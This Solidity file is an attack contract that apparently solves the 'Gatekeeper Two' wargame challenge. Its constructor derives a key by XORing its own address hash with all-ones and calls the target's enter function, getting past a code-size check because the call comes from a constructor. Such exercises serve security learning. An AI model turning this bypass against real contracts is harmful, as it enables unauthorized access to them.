// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackGatekeeperTwo {
    address public target;

    constructor(address _target) {
        target = _target;

        bytes8 key = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                uint64(0xFFFFFFFFFFFFFFFF)
        );

        (bool success, ) = target.call(
            abi.encodeWithSignature("enter(bytes8)", key)
        );
        require(success, "Attack failed: Check if key or gas is incorrect");
    }
}
